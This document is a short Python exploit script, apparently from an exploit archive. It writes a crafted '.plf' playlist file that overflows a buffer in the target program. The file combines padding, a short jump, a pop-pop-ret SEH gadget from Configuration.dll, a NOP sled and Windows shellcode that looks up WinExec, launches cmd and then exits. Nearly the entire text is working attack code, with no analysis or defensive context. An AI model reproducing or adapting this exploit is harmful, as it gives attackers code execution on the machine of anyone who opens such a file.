#0x6034023c : pop edi # pop ebx # ret 0x04 |  [Configuration.dll]
#jmp+6 EB 06

shellcode = (
"\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
"\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
"\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
"\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
"\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54\x24\x20\x57\xFF\xD0")

buffer = "A"*608 +"\xeb\x06\x90\x90" + "\x3c\x02\x34\x60" + "\x90"*20 + shellcode
f = open('6.plf','w')
f.write(buffer)
f.close()
